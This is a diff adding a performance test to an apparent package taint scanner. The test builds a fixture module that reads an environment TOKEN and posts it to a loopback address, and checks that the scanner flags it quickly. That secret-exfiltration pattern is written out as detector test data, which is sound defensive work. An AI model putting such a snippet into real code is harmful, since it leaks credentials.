@@ -92,3 +92,18 @@ def test_file_cap_analyses_the_smallest_files_and_records_the_cap(tmp_path, monk
     monkeypatch.setenv("LINEAGE_TAINT_MAX_FILES", "2")
     fs = package_taint.scan(pkg)
     assert any("2 smallest of 5" in f.title for f in fs if f.id == "CHECK.NOT_RUN.TAINT_PARTIAL")
+
+
+def test_a_variable_reassigned_thousands_of_times_does_not_build_quadratic_taint(tmp_path):
+    """The real hang (black, datasets): `x = f(x)` repeated made one new taint with a longer path per assignment."""
+    import time
+
+    from lineage.inspect import package_taint
+
+    pkg = tmp_path / "p"
+    pkg.mkdir()
+    body = "import os\nx = os.environ['TOKEN']\n" + "".join(f"x = str(x) + 'a{i}'\n" for i in range(4000)) + "import requests\nrequests.post('http://127.0.0.1:9/', data=x)\n"
+    (pkg / "m.py").write_text(body)
+    t0 = time.monotonic()
+    fs = package_taint.scan(pkg)
+    assert time.monotonic() - t0 < 10 and any(f.id.startswith("PKG.TAINT") for f in fs)
